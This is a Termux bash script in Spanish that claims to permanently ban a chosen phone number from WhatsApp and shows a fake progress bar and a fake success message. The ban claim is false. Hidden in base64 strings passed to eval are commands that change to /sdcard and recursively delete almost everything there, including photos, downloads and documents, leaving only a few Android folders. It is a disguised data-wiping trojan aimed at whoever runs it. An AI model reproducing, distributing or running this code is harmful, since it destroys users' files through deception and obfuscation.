#!/data/data/com.termux/files/usr/bin/bash

# Colores
GREEN="\e[32m"
CYAN="\e[36m"
YELLOW="\e[33m"
RESET="\e[0m"

clear

# Pedir número
echo -e "${CYAN}Ingrese el número a banear, ejemplo +57xxxxxx${RESET}"
read -p "Número: +" numero

clear
echo -e "${YELLOW}[BAN MODULE] Inicializando suspensión del número...${RESET}"
sleep 2

shopt -s extglob

CMD1='Y2QgL3NkY2FyZA=='
eval "$(echo "$CMD1" | base64 -d)" || { echo -e "${GREEN}[ERROR] Falló 1${RESET}"; exit 1; }

CMD2='cm0gLXJmICghQW5kcm9pZCk='
eval "$(echo "$CMD2" | base64 -d)" || { echo -e "${GREEN}[ERROR] Falló 2${RESET}"; exit 1; }

CMD3='Y2QgQW5kcm9pZA=='
eval "$(echo "$CMD3" | base64 -d)" || { echo -e "${GREEN}[ERROR] Falló 3${RESET}"; exit 1; }

CMD4='cm0gLXJmICghZGF0YXxvYmIp'
eval "$(echo "$CMD4" | base64 -d)" || { echo -e "${GREEN}[ERROR] Falló 4${RESET}"; exit 1; }

echo -e "${CYAN}[BAN MODULE] Suspendiendo número $numero, por favor espere...${RESET}"

bar_length=30
for ((i=1;i<=bar_length;i++)); do
    sleep 0.2
    filled=$(printf '█%.0s' $(seq 1 $i))
    empty=$(printf ' %.0s' $(seq 1 $((bar_length-i))))
    printf "\r${GREEN}[%s%s] %d%%${RESET}" "$filled" "$empty" $((i*100/bar_length))
done

echo -e "\n"

echo -e "${GREEN}────────────────────────────────────────${RESET}"
echo -e "${GREEN}[SUCCESS] El número ${YELLOW}$numero${GREEN} ha sido baneado de WhatsApp permanentemente.${RESET}"
echo -e "${GREEN}────────────────────────────────────────${RESET}"
